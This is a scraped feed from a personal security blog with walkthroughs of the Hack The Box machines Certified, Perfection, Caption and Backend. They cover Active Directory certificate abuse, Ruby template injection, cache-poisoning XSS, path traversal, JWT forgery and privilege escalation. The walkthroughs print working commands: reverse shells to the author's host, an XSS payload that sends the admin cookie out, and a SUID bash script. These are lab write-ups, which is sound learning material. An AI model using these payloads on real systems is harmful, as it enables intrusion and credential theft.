\u0026#39;WriteMembers\u0026#39; -principal \u0026#39;judith.mader\u0026#39; -target-dn \u0026#39;CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=Hack The Box\u0026#39; \u0026#39;certified.htb/judith.mader:judith09\u0026#39; Now I can add the user to the group using net tool net rpc group addmem \u0026#34;Management\u0026#34; \u0026#34;judith.mader\u0026#34; -U \u0026#34;certified.htb/judith.mader%judith09\u0026#34; -S \u0026#34;DC01.certified.htb\u0026#34; Now that the user judith has become member of the group MANAGEMENT@CERTIFIED.Hack The Box I can move to the next step GenericWrite Abuse # Definition The bottom line of GenericWrite is \u0026ndash;\u0026gt; Generic Write Abuse is a type of attack in Active Directory (AD) where an attacker with GenericWrite permissions over an object (such as a user, group, or computer) can modify certain attributes of that object to escalate privileges, maintain persistence, or execute malicious commands.\nI can also change the password of the account but for me using Shadow Credentials Technique is optimal\nDefinition Shadow Credentials Attack is a technique used by attackers to gain persistent access to an Active Directory (AD) environment by manipulating key authentication data. It involves exploiting the way AD handles alternative credentials such as key pairs or certificates associated with user or computer accounts. View links Article-1 Article-2\nPerforming shadow credential attack: pywhisker -d certified.htb -u judith.mader -p judith09 --target management_svc --action add Getting the TGT python3 gettgtpkinit.py certified.htb/management_svc -cert-pfx 2QCAj1n0.pfx -pfx-pass AxYpGIRkSbtAKz4T0aJ4 management_svc.ccache Using the TGT cache to get the NT hash KRB5CCNAME=../management_svc.ccache python3 getnthash.py certified.htb/management_svc -key 841420e74637606f21b9eaaec6a8bfd2cc98eff7fb5167daddb131f3127a96b0 Now that I got the hash passing it to login in EvilwinRm as user management_svc evil-winrm -u management_svc -H a091c1832bcdd46\u0026lt;SNIP\u0026gt; -i certified.htb Got access as user management_svc Got the User flag Privilege Escalation # As the machine name suggests, Lets enumerate AD CS using certipy tool In case if you haven\u0026rsquo;t heard about this tool, Certipy is an offensive tool for enumerating and abusing Active Directory Certificate Services(AD CS). Certipy can be easily installed using python pip3 install certipy-ad or using pipx pipx install certipy-ad On using certipy I came to know that user ca_operators has esc9 vulnerability certipy find -u management_svc -hashes a091c1832bcdd4677c28b5a6a1295584 -dc-ip 10.10.11.41 -vulnerable -enabled -old-bloodhound Abusing the AD CS # Note: This requires perfect time coordination and each command execution intervel should not exceed two minutes before executing next command Lets perform shadow credentials on user ca_operators from management_svc user, since I have GenericAll DACL over it. Using shadow technique I got the hash of user ca_operator certipy shadow auto -u management_svc@certified.htb -hashes \u0026lt;hashes\u0026gt; -account ca_operator I changed the user principal to administrator certipy account update -u management_svc@certified.htb -hashes \u0026lt;hash\u0026gt; -user ca_operator -upn administrator Now abuse the template to get administrator pfx certipy req -username ca_operator@certified.htb -hashes \u0026lt;hash\u0026gt; -ca certified-DC01-CA -template CertifiedAuthentication Note: This above step was failing for me with throwing Netbios timeout error. When it worked, It gave me the pfx of user ca_operator, for a weird reason when I redo all the steps from step one it worked. Now I Changed the user principal back to the same certipy account update -u management_svc@certified.htb -hashes \u0026lt;hash\u0026gt; -user ca_operator -upn ca_operator@certified.htb I easily got the administrator NTLM hash from using this command with administrator.pfx certipy auth -pfx administrator.pfx -domain certified.htb Then I logged in with Administrator user\u0026rsquo;s NT part of the hash evil-winrm -u administrator -H \u0026lt;hash\u0026gt; -i certified.htb Got the Root flag ","date":"15 March 2025","externalUrl":null,"permalink":"/Secure-The-Throne/posts/1742035934336-certified-walkthroughhtb/","section":"Posts","summary":"","title":"Certified Walkthrough(Hack The Box)","type":"posts"},{"content":" Reconnaissance \u0026amp;\u0026amp; Enumeration # Nmap scan results: PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 80:e4:79:e8:59:28:df:95:2d:ad:57:4a:46:04:ea:70 (ECDSA) |_ 256 e9:ea:0c:1d:86:13:ed:95:a9:d0:0b:c8:22:e4:cf:e9 (ED25519) 80/tcp open http nginx | http-methods: |_ Supported Methods: GET HEAD |_http-title: Weighted Grade Calculator Device type: general purpose Running: Linux 5.X OS CPE: cpe:/o:linux:linux_kernel:5 OS details: Linux 5.0 - 5.14 Uptime guess: 15.030 days (since Tue Dec 31 22:06:01 2024) Network Distance: 2 hops TCP Sequence Prediction: Difficulty=259 (Good luck!) IP ID Sequence Generation: All zeros Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel I was hanging around the website to find anything interesting, I am not gonna lie the website is both basic and neat After a while I foud this Weighted grade calculator interesting In the footer of the page it shows/exposes that the website powered by WEBrick 1.7.0. So I noted it down.\nAfter some bunch of research I learnt that WEBrick uses Ruby to run. If I can recall I think there is even a module in ruby named Webrick. I\u0026rsquo;ll leave the details below View the attached Links Link-1 Link-2 Link-3\nLike in python SSTI are possible for Ruby and as this a calculator it gives us more clue to work on that. So I jumped the gun This article showcases the SSTI on a WEBrick made site, talk about being lucky, lol \u0026ndash;\u0026gt; Link here This Medium article helped me a lot with payloads for the ruby SSTI and while I was testing It, I couldn\u0026rsquo;t get any valid results Below contains the example payloads for Ruby. These are some of the payloads that I used for SSTI\n\u0026lt;%= system(\u0026#34;whoami\u0026#34;) %\u0026gt; \u0026lt;%= Dir.entries(\u0026#39;/\u0026#39;) %\u0026gt; \u0026lt;%= File.open(\u0026#39;/example/arbitrary-file\u0026#39;).read %\u0026gt; Exploitation # Some payload worked after little tweaks, But blocked by the web page as Malicious Input anyway. Hey atleast we got something No matter how I URL encode, it didn\u0026rsquo;t even worked. Probably the site blocks the symbols in the payload hmm\u0026hellip; I learnt that URL encoded value of new-line(%0a) helps in bypassing SSTI validation So I used that before the payload as prefix and like a magic it worked The whoami doesn\u0026rsquo;t return any output I tried hitting my machine for a check, and I got the request Request: As everything works fine its time for us to brew the cursed reverse shell payload %0a\u0026lt;%25%3d+system(\u0026#34;bash+-c+\u0026#39;exec+bash+-i+%26\u0026gt;/dev/tcp/10.10.14.10/7001+\u0026lt;%261\u0026#39;\u0026#34;)+%25\u0026gt; It worked and we are as user susan now Secured User flag Privilege Escalation # While enumerating I found two other folders wihin user susan's home directory Migration folder had sqlite database file so for a change I opened the file in the target system itself The database had only one table called users . Inside that table, password hashes for five users were included The hashes were made from using sha256 algorithm I tried cracking the hashes using my tool BananaCracker(Previously sha256_cracker), But it failed Then, I started enumerating system further for privesc vectors and rather I found this /var/mail Inside /var/mail/susan the message reads Due to our transition to Jupiter Grades because of the PupilPath data breach, I thought we should also migrate our credentials (\u0026#39;our\u0026#39; including the other students in our class) to the new platform. I also suggest a new password specification, to make things easier for everyone. The password format is: {firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000} Note that all letters of the first name should be convered into lowercase. Please hit me with updates on the migration when you can. I am currently registering our university with the platform. As per the instructions I created a python script to make password list for user susan output_file = \u0026#34;susan_nasus_password.txt\u0026#34; with open(output_file, \u0026#34;w\u0026#34;) as file: for number in range(1, 1_000_000_001): file.write(f\u0026#34;susan_nasus_{number}\\n\u0026#34;) print(f\u0026#34;File \u0026#39;{output_file}\u0026#39; has been successfully created.\u0026#34;) This would be both easy and fast when using bash for ((i=1; i\u0026lt;=1000000000; i++)); do echo \u0026#34;susan_nasus_$i\u0026#34; \u0026gt;\u0026gt; \u0026#34;$output_file\u0026#34; With the new wordlists I fired up my tool again and got the password You can get my tool from here BananaCracker(Previously known as sha256_cracker). More features will be added by the time of your visit Using the password I logged in via SSH as user susan I really wasn\u0026rsquo;t expecting this twist I was hoping for more steps, anyway I am glad. See this yourself lol User susan can run sudo without any password Got the Root flag ","date":"14 March 2025","externalUrl":null,"permalink":"/Secure-The-Throne/posts/1741808245229-perfection-walkthroughhtb/","section":"Posts","summary":"","title":"Perfection Walkthrough(Hack The Box)","type":"posts"},{"content":" Reconnaissance # On scanning the ports we can see that there are three ports open We got two web services running. which are on port 80 (caption) and on port 8080 (git bucket) More importantly after some recon I come to know about a login page on port 80 which is caption, however we don\u0026rsquo;t have the credentials yet so I started digging further The Gitbucket on port 8000 had two repos, interesting isn\u0026rsquo;t it The repository files didn\u0026rsquo;t give that much of valuable information. but\u0026hellip; Enumeration # I got tired of the repo files so I checked commits, the recent commits were done by user Administrator where the old were done by user root So I tried enumerating the commits further and on accessing the commit Access control, I saw credentials in the chage Those creds worked on the login page on caption(port 80), So using the creds I was able to log in on Caption-Portal\nIt looked like a typical hack the box page but when I tried accessing /logs from the caption-portal it showed me access denied error. But at initially on seeing it I was happy cause I thought I could have command injection or something. But if you think about it which is unlikely now. After a while, I found that there is a cache server running along with the web server, which is called varnish, Actually we could\u0026rsquo;ve learned about this from the source code(repo) too Varnish Cache is a web application accelerator also known as a caching HTTP reverse proxy. You install it in front of any server that speaks HTTP and configure it to cache the contents.\nApparently this caching server will cache the same page for all users for quick loading of contents\nAgain after a while I found that when using X-Forwaded-Host: header on the request of pages like /home and /firewalls actually loads it\u0026rsquo;s value on the response and caches the same page for everyone(including admin) using varnish caching server. \u0026#34; \u0026lt;/script\u0026gt; \u0026lt;script\u0026gt;new Image().src=\u0026#34;https://10.10.14.12:8000/?c=\u0026#34;+document.cookie;\u0026lt;/script\u0026gt; So I made and used the the above xss payload to get admin cookie which was successful. Even after including the admin cookie, still haproxy blocking my request to the page /logs which was frustrating I was searching for a tool to bypass this, fortunatly one friend suggested me this great tool called h2csmuggler and using that tool I was easily able to bypass the 403 of /logs From the response I got the location of logs files After hours of checking the logs files, I came to know that it didn\u0026rsquo;t has anything useful, Full of garbage h2csmuggler.py -x http://caption.htb:80 -H \u0026#39;Cookie: session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzM1NDY5NTAzfQ.KlugtV3zNPowolIMi0EUkDB_CFUx0MdmDSkNWEX1KHo\u0026#39; \u0026#39;http://caption.htb:80/download\u0026lt;redacted\u0026gt; See it\u0026rsquo;s garbage contents yourselves But on visiting the plain url without the logs path it rather reveals something interesting These ./cpr folders are looking interesting aren\u0026rsquo;t they Researched about them and found a vulnerability in copyparty, Which includes a path traversal vulnerability on versions 1.8.2 The POC looked like this: curl -i -s -k -X GET \u0026#39;http://127.0.0.1:3923/.cpr/%2Fetc%2Fpasswd\u0026#39; The above path also has SSRF vulnerability Exploitation # Using this plainly didn\u0026rsquo;t work for me But with little twerk, actually have to double encode the payload This was my initial payload to read /etc/passwd .cpr//etc/passwd The Final URL encoded payload: %2e%63%70%72%2f%25%32%46%65%74%63%25%32%46%70%61%73%73%77%64 As this was working, for SSH access I tried to read id_rsa for user margo and got nothing, then after some hours I figured that it\u0026rsquo;s not a RSA key that I should look for\u0026hellip; /.cpr//home/margo/.ssh/id_ecdsa Logged in with the key and got the User flag Don\u0026rsquo;t worry guys we are halfway through Privilege Escalation # I started enumerating with internal services and we got multiple services but one looks particularly interesting ss -tunlp The reason is, there is a code mentioning about port 9090 within the gitbucket\u0026rsquo;s Logservice repo So as usual as I reverse forwarded that particular service port to my host machine There were no interface I was stuck here so I researched the repo again and learned about Thrift. Where Thrift is used to connect with log services. Researched on Thrift View articles Link-1 Link-2\nAlso after some further enumeration and code review I found a really bad code on the log service This regex code snippet reads a arbitary log file and takes the values of User-Agent from, it takes timestamp\u0026rsquo;s value. Also it notes the IP address which is not potential for this context This can be exploited by injecting a command within the user agent of log files. As the code configured to read the user-agent value, the injected command would be executed. For this to be done we need Thrift installed on the local machine. Then we need a client on the local machine to tell the Log service to read our malicious file on the target using thrift. When it reads the log file our command will be executed. So I installed Thrift using pip3 pip3 install thrift To create the client, first we have to create an api configuration file for the client Created a file named api2.thrift with this following code namespace py log_service exception LogServiceException { 1: string message } service LogService { /** * Reads the log file from the specified file path. * @param filePath - The path of the log file to read. * @return string - A message indicating the processing status. * @throws LogServiceException - If an error occurs during processing. */ string ReadLogFile(1: string filePath) throws (1: LogServiceException error) } Installed compiler using sudo apt install thrift-compiler although not recommended Ran the following command and created modules directory in python language thrift --gen py api2.thrift Inside the directory I created client.py file with this code from thrift import Thrift from thrift.transport import TSocket from thrift.transport import TTransport from thrift.protocol import TBinaryProtocol from log_service import LogService # Import generated Thrift client code def main(): # Set up a transport to the server transport = TSocket.TSocket(\u0026#39;localhost\u0026#39;, 9090) # Buffering for performance transport = TTransport.TBufferedTransport(transport) # Using a binary protocol protocol = TBinaryProtocol.TBinaryProtocol(transport) # Create a client to use the service client = LogService.Client(protocol) # Open the connection transport.open() try: # Specify the log file path to process log_file_path = \u0026#34;/tmp/bad.log\u0026#34; # Call the remote method ReadLogFile and get the result response = client.ReadLogFile(log_file_path) print(\u0026#34;Server response:\u0026#34;, response) except Thrift.TException as tx: print(f\u0026#34;Thrift exception: {tx}\u0026#34;) # Close the transport transport.close() if __name__ == \u0026#39;__main__\u0026#39;: main() After that I created two files One is bad.log file with this as content 999.9.9.9 \u0026#34;user-agent\u0026#34;:\u0026#34;\u0026#39;; /bin/bash /tmp/bad.sh #\u0026#34; Second is bad.sh file with this chmod +s /bin/bash Transferred both the files to the /tmp folder of the target system and also gave appropriate permissions From the host hosted a python server From the target system All complications are over. By now if client.py is executed it will speak with the Log-service and make it to read the file /tmp/bad.log As the file contains malicious code. It will make the Log-service to execute a script named bad.sh as root. The script will give SUID permissions to /bin/bash making it to be executed as root by anyone. Fired the script successfully Our exploit worked\u0026hellip;. It was a success Executing the /bin/bash with preserve flag -p gave a shell as root. Finally got the Root flag Feedback: This box was awesome at same time it was a misery. It took me 5 days to pwn this box. ","date":"12 March 2025","externalUrl":null,"permalink":"/Secure-The-Throne/posts/1741762551259-caption-walkthroughhtb/","section":"Posts","summary":"","title":"Caption Walkthrough(Hack The Box)","type":"posts"},{"content":" Reconnaissance \u0026amp; Enumeration # Nmap scan results: 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA) | 256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA) |_ 256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519) 80/tcp open http Uvicorn |_http-title: Site doesn\u0026#39;t have a title (application/json). | http-methods: |_ Supported Methods: GET Device type: general purpose Running: Linux 4.X|5.X OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 OS details: Linux 4.15 - 5.19 Uptime guess: 17.734 days (since Sun Feb 16 04:30:26 2025) Network Distance: 2 hops TCP Sequence Prediction: Difficulty=255 (Good luck!) IP ID Sequence Generation: All zeros Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 3306/tcp) HOP RTT ADDRESS 1 265.74 ms 10.10.14.1 2 265.82 ms 10.10.11.161 After hours of fuzzing I found multiple endpoints, where by simply playing with endpoints in burp we can reveal more. But one in particular /docs asks for authentication cookie. We can also do directory fuzzing in recursive mode with any tool but I personally found the endpoints just by guessing them. There is one signup endpoint which is api/v1/user/signup. Using this endpoint I can create an account. After enumerating further on that endpoint I found all the data parameters of it. Now I can create an account using this curl -v -X POST \u0026#39;http://10.10.11.161/api/v1/user/signup\u0026#39; -H \u0026#39;Content-Type: application/json\u0026#39; -d \u0026#39;{\u0026#34;email\u0026#34;:\u0026#34;Emp5r0R@king.com\u0026#34;, \u0026#34;password\u0026#34;:\u0026#34;password\u0026#34;}\u0026#39; | jq Eventually I found another endpoint which is /login. But initially it was showing error on sending the json data but it turns out this endpoint only accept HTML data. I curled the endpoint curl -v \u0026#39;http://10.10.11.161/api/v1/user/login\u0026#39; -d \u0026#39;username=Emp5r0R@king.com\u0026amp;password=password\u0026#39; | jq . In return I got the JWT token Curl Output: I used this extension to modify the header, I could\u0026rsquo;ve used burp interceptor but for some reason it didn\u0026rsquo;t worked for me as intended. I tried to access /docs endpoint with providing the token, After including it, I was redirected to FastAPI interface. Surpisingly,SecretFlagEndpoint straight out gave User flag I didn\u0026rsquo;t expect this After some enumeration I found this endpoint /api/v1/user/0 which on modifying the Id parameter spits out user information. This Id 1 gave me the admin details.\ncurl -X \u0026#39;GET\u0026#39; \\ \u0026#39;http://10.10.11.161/api/v1/user/1\u0026#39; \\ -H \u0026#39;accept: application/json\u0026#39; | jq I can change password of any user If I had guid, As I already have the guid of user admin I can change admin account\u0026rsquo;s password by curling this endpoint /api/v1/user/updatepass with valid data. curl -X \u0026#39;POST\u0026#39; \\ \u0026#39;http://10.10.11.161/api/v1/user/updatepass\u0026#39; \\ -H \u0026#39;accept: application/json\u0026#39; \\ -H \u0026#39;Content-Type: application/json\u0026#39; \\ -d \u0026#39;{ \u0026#34;guid\u0026#34;: \u0026#34;36c2e94a-4271-4259-93bf-c96ad5948284\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;emperor\u0026#34; }\u0026#39; Using the newly changed password I authorized myself with FastAPI Now I can access admin endpoints as I am an admin now to FastAPI Here the endpoint file seems to be useful, actually I can read arbitary files using this endpoint. First let me try and access /etc/passwd\ncurl -X \u0026#39;POST\u0026#39; \\ \u0026#39;http://10.10.11.161/api/v1/admin/file\u0026#39; \\ -H \u0026#39;accept: application/json\u0026#39; \\ -H \u0026#39;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzQxOTM2OTU0LCJpYXQiOjE3NDEyNDU3NTQsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.eL4UaJ5NCf-TEpWdq21t-kEbO-7YJTmmLLkooJussuE\u0026#39; \\ -H \u0026#39;Content-Type: application/json\u0026#39; \\ -d \u0026#39;{ \u0026#34;file\u0026#34;: \u0026#34;/etc/passwd\u0026#34; }\u0026#39; | jq It was successfull However when I try to run commands using this endpoint /api/v1/admin/exec/\u0026lt;commands\u0026gt; I get this error. Hmm\u0026hellip; what could it be ü§î From /etc/passwd I got to know that user htb has bash access. Exploitation # To identify the web application running directory I can request to read this file path /proc/self/environ. From reading the file I identified the running directory of this web. curl -X \u0026#39;POST\u0026#39; \\ \u0026#39;http://10.10.11.161/api/v1/admin/file\u0026#39; \\ -H \u0026#39;accept: application/json\u0026#39; \\ -H \u0026#39;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzQxOTM2OTU0LCJpYXQiOjE3NDEyNDU3NTQsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.eL4UaJ5NCf-TEpWdq21t-kEbO-7YJTmmLLkooJussuE\u0026#39; \\ -H \u0026#39;Content-Type: application/json\u0026#39; \\ -d \u0026#39;{ \u0026#34;file\u0026#34;: \u0026#34;/proc/self/environ\u0026#34; }\u0026#39; | jq -r \u0026#39;.file\u0026#39; The path should be this /home/htb/uhc/app/main.py I requested for the source code using file endpoint and got it import asyncio from fastapi import FastAPI, APIRouter, Query, HTTPException, Request, Depends from fastapi_contrib.common.responses import UJSONResponse from fastapi import FastAPI, Depends, HTTPException, status from fastapi.security import HTTPBasic, HTTPBasicCredentials from fastapi.openapi.docs import get_swagger_ui_html from fastapi.openapi.utils import get_openapi from typing import Optional, Any from pathlib import Path from sqlalchemy.orm import Session from app.schemas.user import User from app.api.v1.api import api_router from app.core.config import settings from app import deps from app import crud app = FastAPI(title=\u0026#34;UHC API Quals\u0026#34;, openapi_url=None, docs_url=None, redoc_url=None) root_router = APIRouter(default_response_class=UJSONResponse) @app.get(\u0026#34;/\u0026#34;, status_code=200) def root(): \u0026#34;\u0026#34;\u0026#34; Root GET \u0026#34;\u0026#34;\u0026#34; return {\u0026#34;msg\u0026#34;: \u0026#34;UHC API Version 1.0\u0026#34;} @app.get(\u0026#34;/api\u0026#34;, status_code=200) def list_versions(): \u0026#34;\u0026#34;\u0026#34; Versions \u0026#34;\u0026#34;\u0026#34; return {\u0026#34;endpoints\u0026#34;:[\u0026#34;v1\u0026#34;]} @app.get(\u0026#34;/api/v1\u0026#34;, status_code=200) def list_endpoints_v1(): \u0026#34;\u0026#34;\u0026#34; Version 1 Endpoints \u0026#34;\u0026#34;\u0026#34; return {\u0026#34;endpoints\u0026#34;:[\u0026#34;user\u0026#34;, \u0026#34;admin\u0026#34;]} @app.get(\u0026#34;/docs\u0026#34;) async def get_documentation( current_user: User = Depends(deps.parse_token) ): return get_swagger_ui_html(openapi_url=\u0026#34;/openapi.json\u0026#34;, title=\u0026#34;docs\u0026#34;) @app.get(\u0026#34;/openapi.json\u0026#34;) async def openapi( current_user: User = Depends(deps.parse_token) ): return get_openapi(title = \u0026#34;FastAPI\u0026#34;, version=\u0026#34;0.1.0\u0026#34;, routes=app.routes) app.include_router(api_router, prefix=settings.API_V1_STR) app.include_router(root_router) def start(): import uvicorn uvicorn.run(app, host=\u0026#34;0.0.0.0\u0026#34;, port=8001, log_level=\u0026#34;debug\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: # Use this for debugging purposes only import uvicorn uvicorn.run(app, host=\u0026#34;0.0.0.0\u0026#34;, port=8001, log_level=\u0026#34;debug\u0026#34;) This is just a basic code let\u0026rsquo;s analyze other files. From the import headers I can learn about other file locations. from app.schemas.user import User from app.api.v1.api import api_router from app.core.config import settings On requesting/app/core/config.py I got the jwt secret from pydantic import AnyHttpUrl, BaseSettings, EmailStr, validator from typing import List, Optional, Union from enum import Enum class Settings(BaseSettings): API_V1_STR: str = \u0026#34;/api/v1\u0026#34; JWT_SECRET: str = \u0026#34;SuperSecretSigningKey-Hack The Box\u0026#34; ALGORITHM: str = \u0026#34;HS256\u0026#34; # 60 minutes * 24 hours * 8 days = 8 days ACCESS_TOKEN_EXPIRE_MINUTES: int = 60 * 24 * 8 # BACKEND_CORS_ORIGINS is a JSON-formatted list of origins # e.g: \u0026#39;[\u0026#34;http://localhost\u0026#34;, \u0026#34;http://localhost:4200\u0026#34;, \u0026#34;http://localhost:3000\u0026#34;, \\ # \u0026#34;http://localhost:8080\u0026#34;, \u0026#34;http://local.dockertoolbox.tiangolo.com\u0026#34;]\u0026#39; BACKEND_CORS_ORIGINS: List[AnyHttpUrl] = [] @validator(\u0026#34;BACKEND_CORS_ORIGINS\u0026#34;, pre=True) def assemble_cors_origins(cls, v: Union[str, List[str]]) -\u0026gt; Union[List[str], str]: if isinstance(v, str) and not v.startswith(\u0026#34;[\u0026#34;): return [i.strip() for i in v.split(\u0026#34;,\u0026#34;)] elif isinstance(v, (list, str)): return v raise ValueError(v) SQLALCHEMY_DATABASE_URI: Optional[str] = \u0026#34;sqlite:///uhc.db\u0026#34; FIRST_SUPERUSER: EmailStr = \u0026#34;root@ippsec.rocks\u0026#34; class Config: case_sensitive = True settings = Settings() Forging JWT Token Earlier while trying to access /execute/\u0026lt;Command\u0026gt; I got missing debug key error I can forge a JWT with debug option included. On working on this I got error because Of time skew between the target(JWT Token) and my system is too high. So I made this program to display the time stamp from the token import jwt import time import datetime token = \u0026#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzQxOTM2OTU0LCJpYXQiOjE3NDEyNDU3NTQsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.eL4UaJ5NCf-TEpWdq21t-kEbO-7YJTmmLLkooJussuE\u0026#34; decoded_payload = jwt.decode(token, options={\u0026#34;verify_signature\u0026#34;: False}) print(decoded_payload) iat_timestamp = decoded_payload[\u0026#39;iat\u0026#39;] current_time_timestamp = int(time.time()) print(f\u0026#34;iat timestamp: {iat_timestamp}\u0026#34;) print(f\u0026#34;current time timestamp: {current_time_timestamp}\u0026#34;) print(f\u0026#34;iat datetime: {datetime.datetime.fromtimestamp(iat_timestamp)}\u0026#34;) print(f\u0026#34;current datetime: {datetime.datetime.fromtimestamp(current_time_timestamp)}\u0026#34;) This was the output, As we can see the time skew is 3 hours(approx). So I made the code to adapt to the time and forged jwt token import jwt import datetime token = \u0026#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzQxOTM2OTU0LCJpYXQiOjE3NDEyNDU3NTQsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.eL4UaJ5NCf-TEpWdq21t-kEbO-7YJTmmLLkooJussuE\u0026#34; secret = \u0026#34;SuperSecretSigningKey-Hack The Box\u0026#34; leeway = datetime.timedelta(hours=3) decoder = jwt.decode(token, secret, [\u0026#34;HS256\u0026#34;], leeway=leeway) print(decoder) decoder[\u0026#34;debug\u0026#34;] = True # Adding debug option. encoded_token = jwt.encode(decoder, secret, algorithm=\u0026#34;HS256\u0026#34;) #encode the dictionary. print(f\u0026#34;Encoded token: {encoded_token}\u0026#34;) Got the token Using the token, I executed some commands via /api/admin/exec/\u0026lt;command\u0026gt; and It worked\ncurl -v -X \u0026#39;GET\u0026#39; \\ \u0026#39;http://10.10.11.161/api/v1/admin/exec/pwd\u0026#39; \\ -H \u0026#39;accept: application/json\u0026#39; \\ -H \u0026#39;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzQxOTM2OTU0LCJpYXQiOjE3NDEyNDU3NTQsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQiLCJkZWJ1ZyI6dHJ1ZX0.yWQeRZjjOrROK-XosRoR8lMf52e3YxNtX4bhj3haUBw\u0026#39; Getting reverse shell Encoded bash reverse shell payload into base64.\necho \u0026#39;bash -c \u0026#34;exec bash -i \u0026amp;\u0026gt;/dev/tcp/10.10.14.10/6001 \u0026lt;\u0026amp;1\u0026#34;\u0026#39; | base64 Then created this payload, here %20 represents white space in URL encoded form. The raw command here is echo \u0026lt;Base64-encoded-payload\u0026gt; | base64 -d | bash Final payload for reverse shell: curl -s \\ \u0026#39;http://10.10.11.161/api/v1/admin/exec/echo%20YmFzaCAtYyAiZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTAuMTAuMTQuMTAvNjAwMSA8JjEiCg==%20|%20base64%20-d%20|%20bash\u0026#39; \\ -H \u0026#39;accept: application/json\u0026#39; \\ -H \u0026#39;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzQxOTM2OTU0LCJpYXQiOjE3NDEyNDU3NTQsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQiLCJkZWJ1ZyI6dHJ1ZX0.yWQeRZjjOrROK-XosRoR8lMf52e3YxNtX4bhj3haUBw\u0026#39; Opened a netcat listener on my system (nc -lnvp 6001) and got the shell connection, then I upgraded the shell Privilege Escalation # Found a file called uhc.db It had password hash for my accounts and for other but nothing useful There was another interesting file named auth.log. Which had admin logon logs, Also it had a string which seemed out of place. Actually that was the password for root user. Got the Root flag ","date":"10 March 2025","externalUrl":null,"permalink":"/Secure-The-Throne/posts/1741592170890-backend-walkthroughhtb/","section":"Posts","summary":"","title":"Backend Walkthrough(Hack The Box)","type":"posts"},{"content":"I\u0026rsquo;m Emp5r0R, and I\u0026rsquo;m really into space and cybersecurity. This website? It\u0026rsquo;s my way of sharing all the cool stuff that sparks my curiosity. I\u0026rsquo;m a big believer in ethical hacking ‚Äì it\u0026rsquo;s how I learn and explore. You\u0026rsquo;ll often find me on platforms like Hack The Box and Try Hack Me, getting my hands dirty and having fun.\n\u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e Don\u0026rsquo;t forget to visit me on Hack The Box. Also I built this tool, a hash cracker which can rival even hashcat in terms of speed. Although it supports way less hashing algorithms for now, worry not I will keep on improving the tool.\nEmp5r0R/BananaCracker This is a super fast hash password cracker, which can take any password dictionary file as input for the purpose of cracking. Rust 2 0 ","date":"7 March 2025","externalUrl":null,"permalink":"/Secure-The-Throne/about/","section":"Secure The Throne","summary":"Learn more about me and why I started this site.","title":"$WHOAMI","type":"page"},{"content":"","date":"7 March 2025","externalUrl":null,"permalink":"/Secure-The-Throne/tags/database/","section":"Tags","summary":"","title":"Database","type":"tags"},{"content":" Reconnaissance and Enumeration # Nmap scan results: PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-01-13 15:46:46Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: Hack The Box) 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: 